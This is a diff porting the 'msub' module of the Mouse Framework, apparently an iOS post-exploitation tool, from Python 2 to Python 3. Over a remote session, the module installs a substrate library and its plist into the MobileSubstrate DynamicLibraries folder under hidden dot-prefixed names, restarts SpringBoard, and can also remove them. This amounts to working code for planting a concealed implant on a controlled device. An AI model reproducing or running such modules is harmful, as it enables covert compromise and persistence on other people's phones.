@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -26,16 +26,16 @@ class command:
         self.name = "msub"
         self.description = "Mouse Substrate."
         self.usage = "Usage: msub [install|uninstall]"
-    
+
     def run(self,session,cmd_data):
         if not cmd_data['args'] or not cmd_data['args'] in ['install','uninstall']:
-       		print self.usage
-       		return
-       	if cmd_data['args'] == "install":
-    	    h.info_general("Uploading msub.dylib (1/2)...")
+            print(self.usage)
+            return
+        if cmd_data['args'] == "install":
+            h.info_general("Uploading msub.dylib (1/2)...")
             session.upload_file("substrate/msub.dylib","/Library/MobileSubstrate/DynamicLibraries",".msub.dylib")
             time.sleep(0.5)
-    	    h.info_general("Uploading msub.plist (2/2)...")
+            h.info_general("Uploading msub.plist (2/2)...")
             session.upload_file("substrate/msub.plist","/Library/MobileSubstrate/DynamicLibraries",".msub.plist")
             time.sleep(0.5)
             h.info_general("Restarting SpringBoard...")
@@ -45,7 +45,7 @@ class command:
             h.info_general("Removing msub.dylib (1/2)...")
             session.send_command({"cmd":"rm","args":"/Library/MobileSubstrate/DynamicLibraries/.msub.dylib"})
             time.sleep(0.3)
-    	    h.info_general("Removing msub.plist (2/2)...")
+            h.info_general("Removing msub.plist (2/2)...")
             session.send_command({"cmd":"rm","args":"/Library/MobileSubstrate/DynamicLibraries/.msub.plist"})
             time.sleep(0.3)
             h.info_general("Restarting SpringBoard...")
